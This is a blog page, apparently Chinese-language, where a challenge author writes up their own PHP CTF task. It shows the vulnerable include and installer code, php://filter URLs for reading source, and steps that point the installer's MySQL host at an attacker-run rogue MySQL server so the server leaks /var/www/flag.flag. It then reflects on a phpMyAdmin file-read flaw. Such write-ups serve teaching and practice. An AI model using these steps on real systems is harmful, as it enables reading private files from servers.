@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>小组CTF出题感想 - x1a0t&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=PHP,CTF>
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="x1a0t&#39;s Blog" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">x1a0t&#39;s Blog</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/links" class="menu-item-link">Links</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/notes" class="menu-item-link">Notes</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">小组CTF出题感想</h1>
+  </div>
+   <div class="post-meta">
+    <span class="post-time">2019-03-09</span>
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>
+    
+  </div>
+  <div class="post-content">
+    <h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><p>首页给出了代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(ROBOTS, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>define中提示了ROBOTS，访问robots.txt是可以知道目录情况的，有两个目录admin和install</p>
+<p>分别访问，会发现admin目录提示无法访问，install目录提示已经安装过了</p>
+<p>通过首页的代码可以去读取这两个目录下的代码,base64解码出源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ctf.chaffee.cc:23333/?action=php://filter/convert.base64-encode/resource=admin/index</span><br><span class="line">http://ctf.chaffee.cc:23333/?action=php://filter/convert.base64-encode/resource=install/index</span><br></pre></td></tr></table></figure>
+<h2 id="admin-index-php"><a href="#admin-index-php" class="headerlink" title="admin&#x2F;index.php"></a>admin&#x2F;index.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&quot;ROBOTS&quot;</span>)) &#123;<span class="keyword">die</span>(<span class="string">&quot;Access Denied&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Congratulate hack to here, But flag in /var/www/flag.flag&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>通过直接action&#x3D;admin&#x2F;index也是可以绕过访问限制获取这条提示的</p>
+<h2 id="install-index-php"><a href="#install-index-php" class="headerlink" title="install&#x2F;index.php"></a>install&#x2F;index.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./install.lock&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Have installed!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$database</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;database&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$host</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$user</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$passwd</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$database</span>)) &#123;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$host</span>, <span class="variable">$user</span>, <span class="variable">$passwd</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;DROP DATABASE &quot;</span>.<span class="variable">$database</span>);</span><br><span class="line">        <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;CREATE DATABASE &quot;</span>.<span class="variable">$database</span>);</span><br><span class="line">        <span class="comment">//To be continued</span></span><br><span class="line">        <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$config</span> = <span class="string">&quot;&lt;?php\n\$config=&quot;</span>;</span><br><span class="line">        <span class="variable">$config</span> .= <span class="title function_ invoke__">var_export</span>(<span class="keyword">array</span>(<span class="string">&quot;host&quot;</span>=&gt;<span class="variable">$host</span>, <span class="string">&quot;user&quot;</span>=&gt;<span class="variable">$user</span>, <span class="string">&quot;passwd&quot;</span>=&gt;<span class="variable">$passwd</span>), <span class="literal">TRUE</span>).<span class="string">&quot;;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;/config.php&quot;</span>, <span class="variable">$config</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="分析攻击"><a href="#分析攻击" class="headerlink" title="分析攻击"></a>分析攻击</h2><p>这里的file_exists中判断锁文件使用的是相对路径，导致我们首页对其进行包含时，可绕过这里</p>
+<p>进入安装过程，有一处写配置文件的操作，然而由于有var_export函数，是无法闭合掉引号的，是无法写入shell的</p>
+<p>唯一能用的代码就是这里的数据库联接操作，其实了解过利用mysql客户端任意文件读取就很清楚了。</p>
+<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>1.在vps上下载恶意服务器代码<br><a href="https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py">https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</a><br>2.修改rogue_mysql_server.py中的配置项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT = 3306</span><br><span class="line">filelist = (</span><br><span class="line">    &#x27;/var/www/flag.flag&#x27;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>3.运行代码<code>python rogue_mysql_server.py</code><br>4.放送恶意请求,host为vps，其余参数随意填</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf.chaffee.cc:23333/?action=install/index&amp;host=172.17.0.1&amp;user=test&amp;passwd=test&amp;database=test</span><br></pre></td></tr></table></figure>
+<p>5.查看vps上的mysql.log文件，即可getflag</p>
+<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>这题灵感来自于最近的phpMyAdmin-4.8.4任意文件读取漏洞，该漏洞并不是phpMyAdmin自己的代码问题，只是因为当允许用户可自己定义mysql服务器的ip时，导致攻击者可搭建恶意mysql服务器，再让phpMyAdmin去请求该恶意服务器，导致文件读取</p>
+<p>我就联想到了以前我分享过的鸡肋文件包含CMS安装脚本的操作，绕过锁文件，可能造成在配置文件写shell，其实也可能造成本CTF这种情况。同样的思路也可以用在任意文件删除造成的重装漏洞上，即便无法getshell，也很可能可以读取文件。(另外不知道在哪儿看到过大佬使用这样的恶意mysql服务器蜜罐，等待那些扫描mysql弱口令的人上钩…)</p>
+
+  </div>
+  <div class="post-footer">
+    <a href="#top" class="top">Post.Top</a>
+  </div>
+</article>
+<footer>
+  &copy; 2024
+  <span class="author">
+    x1a0t
+  </span>
+</footer>
+    </div>
+  </body>
+</html>
